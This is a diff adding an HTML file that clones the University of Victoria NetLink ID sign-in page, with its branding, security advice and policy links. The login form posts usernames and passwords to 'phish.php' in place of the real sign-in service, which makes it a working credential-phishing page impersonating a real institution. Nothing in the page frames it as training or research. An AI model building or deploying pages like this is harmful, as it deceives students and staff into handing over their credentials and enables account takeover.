@@ -1,0 +1,420 @@
+
+
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+
+	<meta content="text/html; charset=UTF-8" http-equiv="Content-Type"/>
+	<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+	<meta content="en" http-equiv="content-language"/>
+	<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+	
+	<title>University of Victoria - Sign in Service</title>
+	<script type="text/javascript">
+		if (60 < window.location.href.indexOf("#") && 50 < window.location.href.indexOf("/mypage/Login%3FrefUrl")) {
+			location.href=window.location.href.replace("#","%2523"); 
+		}
+	</script>
+	<!--Removing the incorrectly scoped CASTGC ticket-->
+        <script type="text/javascript">
+        	document.cookie = "CASTGC=;expires=Thu, 1 Jan 1970 12:00:00 UTC;domain=.uvic.ca;path=/cas/;max-age=0;secure"
+	</script>
+
+	<link rel="shortcut icon" href="https://www.uvic.ca/shared/shared_rootsite/images/logos/favicon.ico" type="image/x-icon" />
+
+
+	<link rel="stylesheet" type="text/css" media="screen and (min-width: 990px)" href="https://www.uvic.ca/assets2012/template3-2/css/style.css" />
+	<link rel="stylesheet" type="text/css" media="screen and (min-width: 768px) and (max-width: 989px)" href="https://www.uvic.ca/assets2012/template3-2/css/tablet.css" />
+	<link rel="stylesheet" type="text/css" media="screen and (max-width: 767px)" href="https://www.uvic.ca/assets2012/template3-2/css/mobile.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.uvic.ca/css/current3/cas.css" />
+	
+    <!--[if lte IE 8]> 
+    <link rel="stylesheet" type="text/css" href="https://www.uvic.ca/assets2012/template3-2/css/style.css" />
+    <link rel="stylesheet" type="text/css" href="https://www.uvic.ca/assets2012/template3-2/css/ie.css">
+    <script type="text/javascript" src="https://www.uvic.ca/assets2012/template3-2/js/html5shiv.js"></script> 
+    <![endif]-->
+    
+	<script type="text/javascript" src="https://www.uvic.ca/js/current3/uvic.pack.js"></script>
+	
+
+</head>
+<body class="right">
+<div id="uvicbar_holder"></div>
+<!-- SSO-173 disregard anything that does not start with http or https -->
+
+	
+		<script src="/assets/blocks/layout/authenticated/gm-uvic-bar.js.php?uvic-bar-url-ref=https://www.uvic.ca/"></script>
+	
+	
+
+<header id='header'>
+		<!-- banner start -->
+    	<div id='banner' class='wrapper'>
+			<a href="https://www.uvic.ca" id='logo'><span>University <br/>of Victoria</span></a>
+
+			
+			<aside id='tools'>
+				<ul>
+					<!-- additional tool links can go here - max 3. Fields: Tool name &amp; tool link - repeatable -->
+					<li><a href="/search/browse/az.php">A-Z</a></li>
+					<li><a href="/search/q/directory.php">directories</a></li>
+					<li><a href="/search/browse/maps.php">Maps</a></li>
+				</ul>
+
+			</aside>			
+			
+			<!-- <a href="/" class="menu"><span>Navigation</span></a> -->
+			
+			<form action="/search/q/web.php" class="search_box mobile-hidden" id="search_box" method="get">
+				<label for="q" class="hidden">Search all UVic</label><!-- search local site -->
+				<input class="search" id="q" maxlength="255" name="q" placeholder="Search all UVic" size="10" type="search" value=""/>
+				<input id="t" name="t" type="hidden" value="4"/>
+				<input id="p" name="p" type="hidden" value="1"/>
+				<input id="g" name="g" type="hidden" value="true"/>
+				<ul class="search_dropdown">
+
+					<!-- search local site -->
+					<li id="search"><a href="/search/q/web.php">Search all UVic</a></li>
+					<li id="staff"><a href="/search/q/directory.php">Search for people</a></li>
+					<li id="departments"><a href="/search/q/department.php">Search for departments</a></li>
+					<li id="experts"><a href="/search/q/experts.php">Search for experts</a></li>
+					<li id="news"><a href="/search/q/news.php">Seach for news</a></li>
+
+					<li id="resources"><a href="/search/q/resources.php">Search for resources</a></li>
+					<li id="policies"><a href="/search/q/policies.php">Search for policies</a></li>
+					<li id="askuvic"><a href="/search/q/askuvic.php">Ask UVic</a></li>
+				</ul>
+			</form>
+			
+        </div>
+		
+		<!-- <div id="sub-unit-bar">
+			<div class="wrapper"><a href="#" id="sub-unit"><span>Sub-unit example goes here</span></a></div>
+		</div> -->
+
+		<!-- Mobile only nav button -->
+		<div class="wrapper">
+			<a href="/" class="menu"><span>Navigation</span></a>
+		</div>
+		<!-- banner end -->
+
+	</header><!-- End of header -->
+  
+	<div id="main" class="wrapper">
+		
+
+<script type="text/javascript">
+$(document).ready(function(){
+	$("#fm1 #username").focus();
+	$("#fm1 #username").blur(function(){
+		$(this).val($(this).val().toLowerCase());
+	});
+	$(".accordions").accordion({
+		autoHeight: false,
+		navigation: true
+	});
+
+    $('.accordions').bind('accordionchange', function (event, ui) {
+        $(window).scrollTop(ui.newHeader.offset().top);
+    });
+});
+</script>
+
+    <div id="content">
+		
+		
+		
+			
+			
+				
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+					 
+					 
+					
+					 
+				
+			
+		
+		
+		
+
+
+
+<div>
+	<h1>Sign in to UVic</h1>
+	<!-- 	
+	<p>
+		Upon sign in you will be redirected to
+		
+		
+		
+		
+			
+				
+					
+				
+			
+			
+		
+		
+		
+		https://www.uvic.ca
+	</p> -->
+</div>
+
+			
+			<p>By signing in you will be authorized to access your applications
+		and web sites that use the Sign in Service. Use is subject to but not limited to the policies and guidelines listed below in <a href="#policies" onclick="$('.accordions').accordion('option','active',2);">Policies and guidelines</a>.</p>
+		
+		<div class="half">
+			<form id="fm1" name="credentials" class="fm-v clearfix uniForm" action="phish.php" method="post">
+	<!-- Congratulations on bringing CAS online!  The default authentication handler authenticates where usernames equal passwords: go ahead, try it out.  -->
+	<div class="box" id="login">
+		<fieldset class="row">
+            
+			<span class="row">
+				<label for="username">NetLink ID:</label>
+				<span class="hint">Do not include "@uvic.ca"</span>
+				
+		
+				
+					
+					<input id="username" name="username" class="required" tabindex="1" type="text" value="" autocomplete="false"/>
+				
+			</span>
+			<span class="row ">
+				<label for="password">Password:</label>
+				
+				
+				<input id="password" name="password" class="required" tabindex="2" type="password" value="" autocomplete="off"/>
+			</span>
+		</fieldset>
+		<fieldset>
+			<legend>Sign in options:</legend>
+			<span class="row check">
+				<input id="workstationType" name="workstationType" value="Private" tabindex="3" accesskey="null" type="checkbox" class="checkbox" />
+				<label for="workstationType" class="checklabel">keep me signed in for 8 hours</label>
+			</span>
+		</fieldset>
+        <div class="buttonHolder btn-row">
+			<input type="hidden" name="lt" value="LT-187-cMncqDbxwpc9qluAKmeBDhop5WADKV" />
+			<input type="hidden" name="execution" value="e3s1" />
+			<input type="hidden" name="_eventId" value="submit" />
+
+                  <input class="btn-submit" name="submit" accesskey="l" value="Sign in" tabindex="4" type="submit" />
+        </div>
+	</div>
+</form>
+<br/>
+<!-- SSO-173 disregard anything that does not start with http or https -->
+
+	<p>
+		<em>Upon sign in you will be redirected to</em> 
+		<a href="https://www.uvic.ca/">https://www.uvic.ca/</a>
+	</p>
+
+        </div>
+		<div class="half right">
+			<h5>Protect your NetLink ID</h5>
+<ul>
+	<li>Watch out for sites or emails that <a href="/systems/status/features/phishing.php">pretend to be legitimate</a> and ask for your NetLink ID and password.</li>
+	<li><a href = "/systems/contact/">Report suspicious requests</a> for your NetLink ID and password.</li>
+	<li>Learn more about <a href ="/systems/contact/">how to protect your account and computer.</a></li>
+</ul>
+		</div>
+		<hr />
+		<h2>About your NetLink ID</h2>
+		
+		<div class="accordions">
+ 	<h3><a href="#" name="section0-0">Sign in help</a></h3>               
+	<div>
+	    <p>Your NetLink ID is your online identification at the University of Victoria that can be used to access computing services and applications.</p>
+	    <p>For security reasons, please <a href = "logout">sign out</a> and exit your web browser when you are done accessing services that require authentication.</p>
+	    <p>
+	    <ul>
+	    <li><a href="/uvicid/get/index.php">Don't have a NetLink ID?</a></li>
+	    <li><a href="/netlink/recover/identifyIssue">Forgot your password?</a></li>
+	    <li><a href="/systems/contact/">Need help with your account?</a></li>
+	    </ul>
+	    </p>
+	
+	</div>
+	<h3><a href="#">Information Security</a></h3>               
+	<div>
+	    <p><strong>Remember to Sign out!</strong></p>
+	    <p><strong>It is your responsibility to protect your account by ensuring you are Signed out before leaving your computer.</strong></p>
+	    <p>Signing into UVic allows you the convenience of only needing to enter your username and password once.  It is important for you to remember the following to prevent others from accessing your account and services:</p>
+	    <ul>
+	    <li>Click the "Sign out of UVic" link from the UVic bar at the top of the page indicating your name and status.</li>
+	    <li>Navigating away from a UVic web site will not automatically sign you out of UVic.</li>
+	    <li>Never share your password with anyone for any reason.</li>
+	    <li>Ensure you have a strong password that is hard for others to guess.</li>
+	    <li>Change your password immediately if you feel your account has been compromised at <a href="/accounts/manage/index">https://www.uvic.ca/accounts/manage/index</a>.</li>
+	    <li>Sign in/out attempts are logged for monitoring, operational and troubleshooting purposes.</li>
+	    <li>Only use the "Keep me signed in for 8 hours" and "Remember my NetLink ID" on secure computers where you have sole access and in a secure location.  Do not use in a computer lab, an Internet cafe, or on a shared account on a home computer.</li>
+	    </ul>
+	    <p>By taking these steps, you will help protect your privacy and the security of information important to you and to UVic.</p>
+	    <p>For further details please refer to the University of Victoria's <a href="/shared/shared_usec/docs/policies/IM7800.pdf">Information Security Policy - IM7800</a></p>
+	</div>
+	<h3><a href="#policies">Policies and guidelines</a></h3>               
+	<div id="policies">
+	    <p>By Signing in you will be authorized to access your applications and websites that use the <em>Sign in to UVic</em> service. Use is subject to but not limited to the following policies and guidelines:</p>
+	     <ul>
+	    <li><a target="_new" href="/universitysecretary/assets/docs/policies/IM7200_6030_.pdf" class="policyName">Acceptable Use of Electronic Information Resources Policy</a></li>
+	    <li><a target="_new" href="/universitysecretary/assets/docs/policies/GV0235.pdf">Protection of Privacy Policy</a></li>
+	    <li><a target="_new" href="/universitysecretary/assets/docs/policies/IM7700.pdf" style="">Records Management Policy - Fair Dealing Guidelines</a></li>
+	    <li><a target="_new" href="/universitysecretary/assets/docs/policies/IM7800.pdf" class="policyName">Information Security Policy</a></li>
+	     </ul>
+	    <p>For further information, see the listing of <a href="universitysecretary/policies/search/index.php">University Policies</a>.</p>
+	</div>
+</div>
+    </div>
+	<nav id="anchorlinks">
+			<ul>
+				<li><a class="anchor-primary" href="#primary"><span>Navigation</span></a></li>
+				<li><a class="anchor-content" href="#content"><span>Content</span></a></li>
+				<li><a class="anchor-footer" href="#mobilelinks"><span>Quick links</span></a></li>
+			</ul>
+	</nav>
+	<div id="left"></div>
+	<div id="right">
+		<div id="serviceMessagePlaceholder">
+</div>
+<script type="text/javascript">
+	$("#serviceMessagePlaceholder").load("/systems/assets/components/content/CasSystemsStatus.php");
+</script>			
+	</div>
+	
+</div> <!--  End wrapper -->
+<div class="AccessibilityInfo">
+		<ul>
+			<li>Return to <a href="#global" title="Return to global menu">global menu</a>.</li>
+			<li>Return to <a href="#primary" title="Return to primary navigation">primary navigation</a>.</li>
+			<li>Return to <a href="#secondary" title="Return to secondary navigation">secondary navigation</a>.</li>
+			<li>Return to <a href="#content" title="Return to page content">page content</a>.</li>
+		</ul>
+	</div>
+	<footer id="footer">
+    	<div class="wrapper">            
+		<div class="col">
+		<h5>Contact</h5>
+		<p>University of Victoria<br>
+		 3800 Finnerty Road<br>
+		 Victoria BC&nbsp;&nbsp;V8P 5C2<br>
+		 Canada<br>
+		 Phone: <a href="tel:1-250-721-7211">1-250-721-7211</a><br>
+		 Fax: <a href="fax:1-250-721-7212">1-250-721-7212</a><br>
+		<a href="/home/about/contact-us/index.php">Contact UVic</a><br>
+		<a href="/home/about/feedback/index.php">Website feedback</a></p>
+		</div>
+		<div class="col">
+		<h5>Copyright</h5>
+		<ul>
+		<li>&copy; 2012 University of Victoria</li>
+		<li><a href="/home/about/copyright/index.php">Copyright info</a></li>
+		<li><a href="/home/about/legal-notices/index.php">Legal notices</a></li>
+		</ul>
+		</div>
+		<div class="col">
+		<h5>Accessibility</h5>
+		<ul><!--
+		<li><a href="#">Mobile version</a></li>
+		-->
+		<li><a href="/home/about/accessibility/index.php">Website accessibility info</a></li>
+		<li class="text-size">Text size <a href="#smaller" class="smaller">A</a> <a href="#regular" class="regular current">A</a> <a href="#larger" class="larger">A</a></li>
+		<li><a href="http://rcsd.uvic.ca/general/campus-accessibility.html">Campus accessibility info</a></li>
+		</ul>
+		</div>
+		<div class="col">
+		<h5>Join the conversation</h5>
+		<ul class="chiclets">
+		<li><a href="http://www.facebook.com/universityofvictoria" class="facebook">Facebook</a></li>
+		<li><a href="http://twitter.com/uvic" class="twitter">Twitter</a></li>
+		<li><a href="http://www.youtube.com/UVic" class="youtube">YouTube</a></li>
+		<li><a href="http://www.flickr.com/groups/uvic/pool/" class="flickr">Flickr</a></li>
+		</ul>
+		<p><a href="/home/about/social-media/index.php">View all social media</a></p>
+		</div>
+    	</div>
+    </footer>
+	<footer id="mobilelinks">
+			<ul>
+				<li><a href="#global-container" class="mobile-top"><span>back to top</span></a></li>
+				<li><a href="/search/browse/maps.php" class="mobile-maps"><span>Campus maps</span></a></li>
+				<!-- <li><a href="#" class="mobile-nextbus"><span>Next bus</span></a></li> -->
+				<li><a href="#" class="mobile-security"><span>Campus Security</span></a></li>
+				<li><a href="/home/about/contact-us/index.php" class="mobile-contact"><span>Contact us</span></a></li>
+				<li><a href="/" class="mobile-home"><span>UVic.ca</span></a></li>
+				<li><a href="/current-students/home/resources/index.php" class="mobile-resources"><span>Student<br> resources</span></a></li>
+				<li><a href="/current-faculty-staff/home/resources/index.php" class="mobile-resources"><span>Faculty &amp; staff<br> resources</span></a></li>
+				<li><a href="future-students.html" class="mobile-sign"><span>Sign in</span></a></li>
+			</ul>
+	</footer>
+	<div class="cover"></div>
+	<div class="cover"></div>
+	
+ </body>
+</html>
